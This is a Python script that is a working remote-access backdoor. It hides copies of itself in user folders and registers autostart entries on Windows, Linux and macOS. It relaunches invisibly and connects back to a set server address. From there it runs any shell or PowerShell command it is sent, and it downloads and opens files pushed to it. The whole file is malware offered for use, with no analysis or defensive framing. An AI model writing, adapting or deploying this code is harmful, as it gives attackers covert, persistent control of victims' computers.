import socket
import subprocess
import os
import tempfile
import time
import struct
import sys
import shutil

server_ip = "192.168.1.11"  # Replace with your server's IP
server_port = 10000         # Replace with your server's port

def run_command(command):
    """Runs a system command."""
    try:
        result = subprocess.run(command, shell=True, check=True)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Error running command: {e}"

def copy_to_autostart():
    """Copy this script to a hidden location and set it to run at startup."""
    # Determine paths for permanent storage and autostart
    if os.name == 'nt':  # Windows
        # Copy the script to a hidden system location (AppData) and use pythonw.exe for silent startup
        target_path = os.path.join(os.getenv('APPDATA'), "systemclient.py")
        if not os.path.exists(target_path):
            shutil.copyfile(sys.argv[0], target_path)  # Copy script if not already copied

        # Add to autostart with pythonw (Windows hidden mode)
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_path, "client_startup.bat")
        with open(bat_path, "w") as f:
            f.write(f'start "" "{sys.executable.replace("python.exe", "pythonw.exe")}" "{target_path}"')

    elif os.name == 'posix':  # macOS or Linux
        # Copy the script to a hidden folder in the user's home directory
        target_path = os.path.join(os.path.expanduser("~"), ".systemclient.py")
        if not os.path.exists(target_path):
            shutil.copyfile(sys.argv[0], target_path)

        # Create autostart entry for Linux/macOS
        autostart_file = os.path.join(os.path.expanduser("~/.config/autostart"), "client.desktop")
        os.makedirs(os.path.dirname(autostart_file), exist_ok=True)
        with open(autostart_file, "w") as f:
            f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {target_path}\nHidden=true\n")

def handle_server_commands(client_socket):
    """Listen for commands from the server and execute them."""
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break

            if data.startswith("file:"):
                filename = data.split(":")[1].strip()
                file_path = os.path.join(tempfile.gettempdir(), filename)
                print(f"Receiving file: {filename}")

                file_size_data = client_socket.recv(8)
                file_size = struct.unpack('>Q', file_size_data)[0]

                with open(file_path, 'wb') as f:
                    bytes_received = 0
                    while bytes_received < file_size:
                        chunk = client_socket.recv(min(1024, file_size - bytes_received))
                        if not chunk:
                            break
                        f.write(chunk)
                        bytes_received += len(chunk)

                print(f"File received: {file_path}")

                try:
                    if os.name == 'nt':
                        os.startfile(file_path)
                    elif os.name == 'posix':
                        subprocess.run(['open' if sys.platform == 'darwin' else 'xdg-open', file_path])
                except Exception as e:
                    print(f"Error opening file: {e}")

            elif data.startswith("powershell:"):
                ps_command = data.split("powershell:")[1]
                print(f"Received PowerShell command: {ps_command}")
                result = run_command(f"powershell {ps_command}")
                print(f"PowerShell Output: {result}")

            elif data:
                print(f"Received command: {data}")
                result = run_command(data)
                print(f"Command Output: {result}")

        except Exception as e:
            print(f"Error with server communication: {e}")
            break

    client_socket.close()

def connect_to_server():
    """Connect to the server and listen for commands, retrying if disconnected."""
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print(f"Connected to server {server_ip}:{server_port}")
            handle_server_commands(client_socket)

        except Exception as e:
            print(f"Unable to connect to server: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    copy_to_autostart()

    if os.name == 'nt':
        # Run with pythonw.exe to keep the console hidden on Windows
        if "pythonw" not in sys.executable:
            # Relaunch the script using pythonw for hidden execution
            subprocess.Popen([sys.executable.replace("python.exe", "pythonw.exe"), *sys.argv])
            sys.exit()  # Exit the current script instance

    connect_to_server()